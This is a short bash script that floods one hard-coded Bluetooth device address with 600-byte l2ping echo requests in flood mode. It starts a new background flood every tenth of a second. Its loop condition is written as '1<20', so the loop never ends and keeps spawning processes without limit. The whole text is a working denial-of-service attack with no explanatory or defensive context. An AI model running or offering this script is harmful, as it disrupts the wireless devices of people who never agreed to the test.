for ((i=0; 1<20; i++))
do 
	l2ping -i hci0 -s 600 -f 08:EB:ED:FE:81:7D &
	sleep 0.1
done 
